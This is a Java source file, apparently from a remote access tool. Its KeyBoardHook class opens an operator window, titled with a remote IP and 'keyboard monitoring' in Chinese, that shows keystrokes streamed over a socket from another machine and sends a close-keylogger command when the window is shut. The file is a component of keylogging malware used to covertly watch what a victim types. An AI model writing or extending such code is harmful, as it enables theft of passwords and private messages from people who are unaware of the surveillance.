package me.server.receive;

import com.sun.jna.platform.WindowUtils;
import me.server.Server;
import me.server.utils.MessageFlags;
import me.server.utils.SendMessage;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.InputStream;
import java.net.Socket;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class KeyBoardHook{
    Socket socket;
    JTextArea area1;
    public KeyBoardHook(Socket socket,String IP) throws Exception{
        this.socket = socket;
        JDialog frame1 = new JDialog();
        InputStream inputStream = Server.class.getClassLoader().getResourceAsStream("me/resources/kb.png");
        Image image = ImageIO.read(inputStream);
        frame1.setIconImage(image);
        frame1.setResizable(false);
        JPanel panel1 = new JPanel();
        frame1.setTitle("\\\\" + IP + "-" + "键盘监听");
        area1 = new JTextArea();
        area1.setEditable(false);
        Font font = new Font(Font.SERIF,Font.PLAIN,20);
        area1.setFont(font);
        JScrollPane scrollPane = new JScrollPane(area1);
        frame1.add(scrollPane,BorderLayout.CENTER);
        frame1.add(panel1,BorderLayout.SOUTH);
        area1.setBackground(Color.BLACK);
        area1.setForeground(Color.green);
        area1.setEditable(false);
        frame1.setLocationRelativeTo(null);
        frame1.setSize(800,600);
        frame1.setVisible(true);
        frame1.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                SendMessage.SendHead(MessageFlags.CLOSE_KEYBORAD,socket);
            }
        });
    }
    public void update(byte[] bytes) {
        area1.append(new String(bytes));
    }
}